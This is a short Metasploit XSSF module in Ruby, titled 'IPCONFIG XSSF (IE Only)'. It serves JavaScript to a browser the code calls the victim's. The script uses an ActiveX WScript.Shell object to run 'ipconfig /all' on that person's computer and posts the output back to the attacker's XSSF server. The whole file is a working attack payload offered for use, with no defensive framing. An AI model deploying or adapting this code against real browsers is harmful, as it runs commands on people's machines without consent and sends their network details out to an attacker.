require 'msf/core'
require 'xssf'        

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'IPCONFIG XSSF (IE Only)',
			'Description' => 'This module get the ipconfig /all result on a victim\'s computer'
		))
	end

	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{ XSSF_POST(((new ActiveXObject("WScript.Shell")).Exec("ipconfig /all")).StdOut.ReadAll(), '#{self.name}'); }
		
		send_response(cli, code, {'Content-Type' => 'text/html'} )
	end
end